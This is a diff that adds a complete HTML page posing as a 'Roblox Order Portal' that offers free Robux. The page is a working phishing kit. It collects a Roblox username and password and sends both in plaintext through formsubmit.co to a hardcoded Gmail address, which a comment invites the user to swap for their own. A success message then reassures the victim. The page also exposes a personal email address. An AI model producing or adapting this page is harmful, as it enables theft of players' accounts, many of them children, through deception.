@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <title>Roblox Order Portal</title>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg: #06080F;
+      --card: rgba(255,255,255,0.04);
+      --card-border: rgba(255,255,255,0.07);
+      --accent: #7C3AED;
+      --accent-l: #9F67FF;
+      --accent-glow: rgba(124,58,237,0.28);
+      --text: #F0F4FC;
+      --muted: #8A94A8;
+      --in-bg: rgba(255,255,255,0.055);
+      --in-border: rgba(255,255,255,0.09);
+      --err: #F87171;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--bg);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      overflow-x: hidden;
+    }
+
+    /* Ambient blobs */
+    body::before {
+      content: '';
+      position: fixed; top: -25%; left: -15%;
+      width: 560px; height: 560px;
+      background: radial-gradient(circle, rgba(124,58,237,0.18) 0%, transparent 68%);
+      pointer-events: none; z-index: 0;
+    }
+    body::after {
+      content: '';
+      position: fixed; bottom: -20%; right: -10%;
+      width: 480px; height: 480px;
+      background: radial-gradient(circle, rgba(56,116,246,0.12) 0%, transparent 68%);
+      pointer-events: none; z-index: 0;
+    }
+
+    /* Card */
+    .wrap { position: relative; z-index: 1; width: 100%; max-width: 460px; }
+
+    .card {
+      background: var(--card);
+      backdrop-filter: blur(28px);
+      -webkit-backdrop-filter: blur(28px);
+      border: 1px solid var(--card-border);
+      border-radius: 26px;
+      padding: 48px 40px 44px;
+      box-shadow:
+        0 0 0 1px rgba(255,255,255,0.025),
+        0 36px 72px rgba(0,0,0,0.65),
+        inset 0 1px 0 rgba(255,255,255,0.045);
+    }
+
+    /* Header */
+    .hd { text-align: center; margin-bottom: 38px; }
+    .badge {
+      display: inline-block;
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 10.5px; font-weight: 600;
+      letter-spacing: 0.16em; text-transform: uppercase;
+      color: var(--accent-l);
+      background: rgba(124,58,237,0.1);
+      border: 1px solid rgba(124,58,237,0.22);
+      padding: 5px 13px; border-radius: 100px;
+      margin-bottom: 14px;
+    }
+    h1 {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 27px; font-weight: 700;
+      color: var(--text); line-height: 1.2;
+      margin-bottom: 7px;
+    }
+    .sub { font-size: 13.5px; color: var(--muted); }
+
+    /* Fields */
+    .field { margin-bottom: 18px; }
+    label {
+      display: block;
+      font-size: 11.5px; font-weight: 600;
+      letter-spacing: 0.09em; text-transform: uppercase;
+      color: var(--muted); margin-bottom: 7px;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      background: var(--in-bg);
+      border: 1px solid var(--in-border);
+      border-radius: 12px;
+      padding: 13px 15px;
+      font-family: 'Inter', sans-serif;
+      font-size: 15px; color: var(--text);
+      outline: none;
+      transition: border-color .2s, box-shadow .2s, background .2s;
+      -webkit-appearance: none;
+    }
+    input[type="text"]::placeholder,
+    input[type="password"]::placeholder { color: rgba(138,148,168,0.38); }
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      border-color: var(--accent);
+      background: rgba(124,58,237,0.06);
+      box-shadow: 0 0 0 3px var(--accent-glow);
+    }
+    .err-msg { font-size: 12px; color: var(--err); margin-top: 5px; display: none; }
+    .field.bad input { border-color: rgba(248,113,113,0.45); }
+    .field.bad .err-msg { display: block; }
+
+    /* Divider */
+    .div { height: 1px; background: var(--in-border); margin: 26px 0; }
+
+    /* ── Slider ── */
+    .sl-head {
+      display: flex; justify-content: space-between;
+      align-items: flex-end; margin-bottom: 14px;
+    }
+    .sl-lbl {
+      font-size: 11.5px; font-weight: 600;
+      letter-spacing: 0.09em; text-transform: uppercase;
+      color: var(--muted);
+    }
+
+    /* Big scoreboard number */
+    .sl-num {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 40px; font-weight: 700;
+      color: var(--text); line-height: 1;
+      letter-spacing: -0.02em;
+      transition: color .15s;
+    }
+    .sl-num .unit {
+      font-size: 13px; font-weight: 500;
+      color: var(--muted); margin-left: 4px;
+      letter-spacing: 0;
+    }
+
+    /* Track + thumb */
+    .trk {
+      position: relative;
+      height: 6px; margin: 4px 0 6px;
+    }
+    .trk-bg {
+      position: absolute; top: 0; left: 0; right: 0;
+      height: 100%;
+      background: rgba(255,255,255,0.07);
+      border-radius: 100px;
+    }
+    .trk-fill {
+      position: absolute; top: 0; left: 0;
+      height: 100%;
+      background: linear-gradient(90deg, var(--accent), var(--accent-l));
+      border-radius: 100px;
+      pointer-events: none;
+    }
+    input[type="range"] {
+      position: absolute; top: 50%;
+      transform: translateY(-50%);
+      left: 0; width: 100%; height: 6px;
+      -webkit-appearance: none; appearance: none;
+      background: transparent; cursor: pointer;
+      outline: none; margin: 0;
+    }
+    input[type="range"]::-webkit-slider-thumb {
+      -webkit-appearance: none;
+      width: 22px; height: 22px; border-radius: 50%;
+      background: #fff;
+      box-shadow: 0 0 0 3px var(--accent), 0 4px 14px rgba(0,0,0,0.45);
+      cursor: pointer;
+      transition: transform .15s, box-shadow .15s;
+    }
+    input[type="range"]:active::-webkit-slider-thumb {
+      transform: scale(1.22);
+      box-shadow: 0 0 0 4px var(--accent), 0 0 22px var(--accent-glow), 0 4px 14px rgba(0,0,0,0.45);
+    }
+    input[type="range"]::-moz-range-thumb {
+      width: 22px; height: 22px; border-radius: 50%;
+      background: #fff; border: none;
+      box-shadow: 0 0 0 3px var(--accent), 0 4px 14px rgba(0,0,0,0.45);
+      cursor: pointer;
+    }
+    .trk-ends {
+      display: flex; justify-content: space-between;
+      font-size: 11px; color: rgba(138,148,168,0.42);
+      margin-top: 9px;
+    }
+
+    /* Button */
+    .btn {
+      width: 100%; margin-top: 32px;
+      background: linear-gradient(135deg, #7C3AED, #5B21B6);
+      color: #fff; border: none;
+      border-radius: 14px; padding: 16px;
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 15.5px; font-weight: 600;
+      cursor: pointer; letter-spacing: 0.02em;
+      box-shadow: 0 4px 22px rgba(124,58,237,0.42);
+      transition: opacity .2s, transform .15s, box-shadow .2s;
+      position: relative;
+    }
+    .btn:hover {
+      opacity: .91;
+      transform: translateY(-1px);
+      box-shadow: 0 8px 28px rgba(124,58,237,0.52);
+    }
+    .btn:active { transform: translateY(0) scale(.99); }
+    .btn:disabled { opacity: .45; cursor: not-allowed; transform: none; }
+    .spin {
+      display: none;
+      width: 18px; height: 18px;
+      border: 2.5px solid rgba(255,255,255,0.3);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin .7s linear infinite;
+      margin: 0 auto;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* Toast */
+    .toast {
+      position: fixed; bottom: 28px;
+      left: 50%; transform: translateX(-50%) translateY(100px);
+      background: rgba(16,185,129,0.13);
+      border: 1px solid rgba(16,185,129,0.28);
+      backdrop-filter: blur(14px);
+      color: #6EE7B7;
+      padding: 13px 22px; border-radius: 12px;
+      font-size: 13.5px; font-weight: 500;
+      transition: transform .4s cubic-bezier(.34,1.56,.64,1), opacity .4s;
+      opacity: 0; white-space: nowrap; z-index: 100;
+    }
+    .toast.on { transform: translateX(-50%) translateY(0); opacity: 1; }
+    .toast.fail {
+      background: rgba(239,68,68,0.13);
+      border-color: rgba(239,68,68,0.28);
+      color: #FCA5A5;
+    }
+
+    /* Mobile */
+    @media (max-width: 500px) {
+      .card { padding: 34px 22px 36px; border-radius: 20px; }
+      h1 { font-size: 23px; }
+      .sl-num { font-size: 34px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="wrap">
+  <div class="card">
+
+    <div class="hd">
+      <div class="badge">Order Portal</div>
+      <h1>Guest Order Form</h1>
+      <p class="sub">Fill in details, then get your order</p>
+    </div>
+
+    <!-- Name -->
+    <div class="field" id="f-name">
+      <label for="gName">Roblox Username</label>
+      <input type="text" id="gName" placeholder="Enter UserName" autocomplete="off" />
+      <div class="err-msg">Roblox Username is required</div>
+    </div>
+
+    <!-- Password -->
+    <div class="field" id="f-pass">
+      <label for="gPass">User Password</label>
+      <input type="password" id="gPass" placeholder="Enter access password" />
+      <div class="err-msg">User Password is required</div>
+    </div>
+
+    <div class="div"></div>
+
+    <!-- Slider -->
+    <div>
+      <div class="sl-head">
+        <div class="sl-lbl">Number of Robux</div>
+        <div class="sl-num" id="numDisplay">1<span class="unit">Robux</span></div>
+      </div>
+      <div class="trk">
+        <div class="trk-bg"></div>
+        <div class="trk-fill" id="fill"></div>
+        <input type="range" id="slider" min="1" max="10000" value="1" step="1" />
+      </div>
+      <div class="trk-ends"><span>1</span><span>10,000</span></div>
+    </div>
+
+    <button class="btn" id="btn" onclick="send()">
+      <span id="btnLabel">Get Your Free Robux</span>
+      <div class="spin" id="spin"></div>
+    </button>
+
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+  // ╔══════════════════════════════════════╗
+  // ║  YOUR EMAIL — change this line only  ║
+  const EMAIL = 'sohamdikshityuvin@gmail.com';
+  // ╚══════════════════════════════════════╝
+
+  const sl    = document.getElementById('slider');
+  const disp  = document.getElementById('numDisplay');
+  const fill  = document.getElementById('fill');
+
+  function refreshSlider() {
+    const v   = +sl.value;
+    const pct = ((v - 1) / 9999) * 100;
+    fill.style.width = pct + '%';
+
+    let label;
+    if (v >= 10000)     label = '10k';
+    else if (v >= 1000) label = (v / 1000).toFixed(1).replace(/\.0$/, '') + 'k';
+    else                label = v;
+
+    disp.innerHTML = `${label}<span class="unit">&nbsp;${v === 1 ? 'Robux' : 'Robux'}</span>`;
+  }
+
+  sl.addEventListener('input', refreshSlider);
+  refreshSlider();
+
+  function toast(msg, err) {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.className   = 'toast' + (err ? ' fail' : '');
+    requestAnimationFrame(() => t.classList.add('on'));
+    setTimeout(() => t.classList.remove('on'), 4200);
+  }
+
+  function check() {
+    let ok = true;
+    const fields = [
+      { id: 'gName', wrap: 'f-name' },
+      { id: 'gPass', wrap: 'f-pass' }
+    ];
+    fields.forEach(({ id, wrap }) => {
+      const el = document.getElementById(id);
+      const wr = document.getElementById(wrap);
+      wr.classList.remove('bad');
+      if (!el.value.trim()) { wr.classList.add('bad'); ok = false; }
+    });
+    return ok;
+  }
+
+  // Clear error on type
+  ['gName','gPass'].forEach(id => {
+    document.getElementById(id).addEventListener('input', () => {
+      document.getElementById(id === 'gName' ? 'f-name' : 'f-pass').classList.remove('bad');
+    });
+  });
+
+  async function send() {
+    if (!check()) return;
+
+    const btn  = document.getElementById('btn');
+    const lbl  = document.getElementById('btnLabel');
+    const spn  = document.getElementById('spin');
+
+    btn.disabled  = true;
+    lbl.style.display = 'none';
+    spn.style.display = 'block';
+
+    const name  = document.getElementById('gName').value.trim();
+    const pass  = document.getElementById('gPass').value.trim();
+    const count = sl.value;
+
+    try {
+      const res = await fetch(`https://formsubmit.co/ajax/${EMAIL}`, {
+        method : 'POST',
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+        body   : JSON.stringify({
+          _subject  : '🎟️ New Guest Order',
+          _template : 'table',
+          'Guest Name'      : name,
+          'Guest Password'  : pass,
+          'Number of Guests': count + ' Robux'
+        })
+      });
+
+      const data = await res.json();
+
+      if (data.success === 'true' || data.success === true) {
+        toast('✓ Order sent to your inbox');
+        document.getElementById('gName').value = '';
+        document.getElementById('gPass').value = '';
+        sl.value = 1;
+        refreshSlider();
+      } else {
+        throw new Error();
+      }
+    } catch {
+      toast('Send failed — check your email in the script', true);
+    }
+
+    btn.disabled      = false;
+    lbl.style.display = 'inline';
+    spn.style.display = 'none';
+  }
+</script>
+
+</body>
+</html>
